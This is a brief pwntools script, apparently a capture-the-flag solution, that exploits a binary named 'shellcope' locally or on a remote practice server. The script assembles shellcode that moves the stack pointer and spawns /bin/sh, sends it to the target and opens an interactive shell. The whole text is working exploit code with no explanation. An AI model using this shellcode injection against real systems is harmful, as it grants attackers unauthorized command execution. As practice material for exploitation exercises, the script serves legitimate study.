from pwn import * 

elf = ELF('./shellcope')
context.log_level = 'DEBUG'
context.arch = 'x86_64'

if args['REMOTE']: 
    p = remote('pwnable.co.il', 9001)
else: 
    p = process([elf.path])
    if args['GDB']: 
        gdb.attach(p)   


payload = (
    asm('lea rax, [rip]') + 
    asm('mov rsp, rax') +    
    asm('add rsp, 0x2000') +   
    asm(shellcraft.sh()) 
    ) 

p.sendline(payload)
p.interactive()
